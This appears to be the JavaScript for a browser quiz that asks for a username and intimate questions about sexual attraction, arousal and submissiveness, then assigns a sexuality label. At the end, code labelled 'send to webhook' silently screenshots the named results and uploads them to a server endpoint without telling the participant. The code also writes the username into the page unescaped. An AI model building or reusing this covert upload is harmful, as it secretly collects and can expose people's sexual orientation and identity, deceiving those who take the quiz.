let currentQuestion = 0;
let answers = {};
let username = "";

// Questions
const questions = [
  { id: "cute", text: "Do you consider yourself cute?", type: "boolean" },
  { id: "femboy", text: "Do people call you feminine / femboy?", type: "boolean" },
  { id: "horny", text: "How horny are you usually? (1–10)", type: "number" },
  { id: "soft", text: "Do you like soft things? (1–10)", type: "number" },
  { id: "color", text: "Pick your favorite color:", type: "select", options: [
      "Red","Orange","Yellow","Green","Blue","Light Blue","Purple","Pink","White","Black"
  ]},
  { id: "affection", text: "Do you like giving affection?", type: "boolean" },
  { id: "receive", text: "Do you like receiving affection?", type: "boolean" },
  { id: "submissive", text: "Are you submissive?", type: "boolean" },
  { id: "romantic", text: "Do you want romance?", type: "boolean" },
  { id: "interest", text: "Are you interested in boys?", type: "boolean" },
  { id: "girls", text: "Are you interested in girls?", type: "boolean" },
];

function askUsername() {
  username = prompt("Enter your name / username:");
  if (!username) username = "Anonymous";
  localStorage.setItem("surveyUsername", username);
  showQuestion();
}

function showQuestion() {
  const container = document.getElementById("survey");
  const q = questions[currentQuestion];

  let input = "";

  if (q.type === "boolean") {
    input = `
      <button onclick="submitAnswer(true)">Yes</button>
      <button onclick="submitAnswer(false)">No</button>
    `;
  } else if (q.type === "number") {
    input = `
      <input type="number" id="numberInput" min="1" max="10">
      <button onclick="submitNumber()">Next</button>
    `;
  } else if (q.type === "select") {
    input = `
      <select id="selectInput">
        ${q.options.map(o => `<option value="${o}">${o}</option>`).join("")}
      </select>
      <button onclick="submitSelect()">Next</button>
    `;
  }

  container.innerHTML = `
    <div class="question-box">
      <h2>${q.text}</h2>
      ${input}
    </div>
  `;
}

function submitNumber() {
  const val = parseInt(document.getElementById("numberInput").value);
  if (!val || val < 1 || val > 10) return alert("Enter a number 1–10");
  submitAnswer(val);
}

function submitSelect() {
  const val = document.getElementById("selectInput").value;
  submitAnswer(val);
}

function submitAnswer(val) {
  answers[questions[currentQuestion].id] = val;
  currentQuestion++;

  if (currentQuestion >= questions.length) {
    showResults();
  } else {
    showQuestion();
  }
}

function showResults() {
  const surveyDiv = document.getElementById("survey");

  // --- Scoring ---
  let softness = 0;
  let horniness = 0;

  softness += answers.cute ? 2 : 0;
  softness += answers.femboy ? 3 : 0;
  softness += answers.soft;
  softness += answers.affection ? 2 : 0;
  softness += answers.receive ? 2 : 0;
  softness += answers.submissive ? 2 : 0;

  horniness += answers.horny;
  horniness += answers.submissive ? 1 : 0;
  horniness += answers.romantic ? 1 : 0;
  horniness += answers.interest ? 2 : 0;
  horniness += answers.girls ? 2 : 0;

  let softnessPercent = Math.min(100, Math.round((softness / 25) * 100));
  let horninessPercent = Math.min(100, Math.round((horniness / 25) * 100));

  // Sexuality logic
  let mainSex = "";
  if (horniness <= 3) mainSex = "Asexual";
  else if (answers.interest && !answers.girls) mainSex = "Gay";
  else if (answers.girls && !answers.interest) mainSex = "Straight";
  else if (answers.interest && answers.girls) {
    if (softness >= 6) mainSex = "Pansexual";
    else mainSex = "Bisexual";
  } else if (softness >= 7) mainSex = "Demisexual";
  else mainSex = "Asexual";

  let sexualities = [mainSex];
  if (mainSex !== "Asexual" && horniness <= 3) {
    sexualities.push("Asexual");
  }

  surveyDiv.innerHTML = `
    <div id="results" class="results-box">
      <h2>Results for ${username}</h2>
      <p><b>Sexuality:</b> ${sexualities.join(" + ")}</p>
      <p><b>Softness:</b> ${softnessPercent}%</p>
      <p><b>Horniness:</b> ${horninessPercent}%</p>
    </div>
  `;

  // --- SCREENSHOT RESULTS & SEND TO WEBHOOK ---
  setTimeout(() => {
    const box = document.getElementById("results");

    html2canvas(box, { backgroundColor: null, scale: 2 })
    .then(canvas => {
      canvas.toBlob(async blob => {
        const form = new FormData();
        form.append("file", blob, "results.png");

        await fetch("/api/send-screenshot", {
          method: "POST",
          body: form
        });
      });
    });
  }, 500);
}

window.onload = askUsername;
